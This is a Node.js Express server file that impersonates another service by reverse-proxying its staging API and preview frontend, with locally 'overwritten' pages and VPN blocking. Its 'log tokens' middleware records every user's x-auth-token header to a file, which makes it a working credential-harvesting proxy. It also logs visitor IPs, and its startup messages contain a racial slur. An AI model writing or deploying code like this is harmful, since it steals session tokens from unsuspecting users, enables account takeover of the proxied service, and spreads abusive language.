const axios = require("axios")
const express = require('express');
const rateLimit = require('express-rate-limit');
const https = require('https');
const path = require('path');
const fs = require('fs');
const url = require('url');
const {
    LRUCache
} = require('lru-cache');
const {
    createProxyMiddleware
} = require('http-proxy-middleware');

const app = express();

const limiter = rateLimit({
    windowMs: 1000,
    max: 6, 
    message: 'too many global requests - please wait a second',
    standardHeaders: true,
    legacyHeaders: false,
});

app.use('/darianAPI', (req, res, next) => {
    next();
});

app.use('/', limiter);

app.set('trust proxy', false)
app.use(require("cors")()) // cors
app.use(require('compression')()) // compression

const options = {
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
};
const cache = new LRUCache({
    max: 10000,
    maxAge: 1000 * 60 * 120, // 2 hours
});
const ipCache = new LRUCache({
    max: 1000,
    maxAge: 1000 * 60 * 10, // 10 min
});

const port = process.argv.includes('dev') ? 3000 : 443
const cacheableExtensions = ['.js', '.png', '.svg', '.html', '.htm', '.css', '.wav', '.mp3', '.png'];
const overwriteDir = path.join(__dirname, 'overwrite');
const tokensFile = 'tokens.json';

app.get("/", (req, res, next) => {
    res.sendFile(path.join(__dirname, "overwrite", "index.html"));
});

// block VPN and proxies
app.use(async (req, res, next) => {
    const ip = req.headers['cf-connecting-ip'] || req.ip;
    try {
        const response = await axios.get(`https://ipwhois.io/${ip}`);
        const data = response.data;
        console.log(data)
        if (data.security.proxy || data.security.vpn || data.security.hosting) {
            console("blocked for weird")
            return res.status(403).send('get off that vpn buddy');
        }
        next();
    } catch (error) {
        next();
    }
});

// gotta know
app.use((req, res, next) => {
    if (req.url.includes("monitoring")) return;

    const ip = req.headers['cf-connecting-ip'] || req.ip;
    console.log(`${req.method} ${req.url} - ${ip}`);
    next();
});

// block history endpoints
app.use((req, res, next) => {
    if (req.url.includes("history") && !req.url.includes("chat") || req.url.includes("geoblock")) {
        return res.status(403)
    }
    next();
});

// overwrite system
app.use((req, res, next) => {
    const originalUrl = req.url;
    const parsedUrl = url.parse(originalUrl, true);
    const pathname = parsedUrl.pathname;

    const overwritePath = path.join(overwriteDir, pathname.replace(/^\//, ''));
    if (fs.existsSync(overwritePath)) {
        res.sendFile(overwritePath);
    } else {
        const ext = path.extname(pathname).toLowerCase();
        if (cacheableExtensions.includes(ext)) {
            const cachedResponse = cache.get(originalUrl);
            if (cachedResponse) {
                res.status(cachedResponse.status).send(cachedResponse.data);
                return;
            }
        }
        next();
    }
});

// log tokens
if (!fs.existsSync(tokensFile)) fs.writeFileSync(tokensFile, JSON.stringify([]));

app.use('/darianAPI', (req, res, next) => {
    const token = req.headers['x-auth-token'];
    if (token) {
        const tokens = JSON.parse(fs.readFileSync(tokensFile, 'utf8'));
        if (!tokens.includes(token)) {
            tokens.push(token);
            fs.writeFileSync(tokensFile, JSON.stringify(tokens, null, 2));
        }
    }
    next();
});

// for API
app.use('/darianAPI', createProxyMiddleware({
    target: 'https://bf-staging-rest.bazooki-infra.dev',
    changeOrigin: true,
    pathRewrite: { '^/darianAPI': '' },
    onProxyReq: (proxyReq, req, res) => {
        proxyReq.setHeader('CF-Bypass-Cache', 'true');
        proxyReq.setHeader('X-Forwarded-For', req.ip);
    },
    onProxyRes: (proxyRes, req, res) => {
        proxyRes.pipe(res);
    },
    onError: (err, req, res) => {
        res.status(500).send(err.message);
    },
}));

// for all fronten requests
app.use(createProxyMiddleware({
    target: 'https://main.bf.bazooki-previews.com', // so this is also kinda funny
    changeOrigin: true,
    onProxyReq: (proxyReq, req, res) => {
        proxyReq.setHeader('CF-Bypass-Cache', 'true');
        proxyReq.setHeader('X-Forwarded-For', req.ip);
    },
    onProxyRes: (proxyRes, req, res) => {
        const ext = path.extname(req.path).toLowerCase();
        if (cacheableExtensions.includes(ext)) {
            const chunks = [];
            proxyRes.on('data', chunk => chunks.push(chunk));
            proxyRes.on('end', () => {
                const data = Buffer.concat(chunks);
                cache.set(req.url, { status: proxyRes.statusCode, data });
                res.send(data);
            });
        } else {
            proxyRes.pipe(res);
        }
    },
    onError: (err, req, res) => {
        res.status(500).send(err.message);
    },
}));

if (port === 3000) {
    // run it locally like a good boy
    app.listen(port, () => {
        console.log("nigga 3000");
    });
} else if (port === 443) {
    https.createServer(options, app).listen(port, () => {
        console.log("nigga 443");
    });
}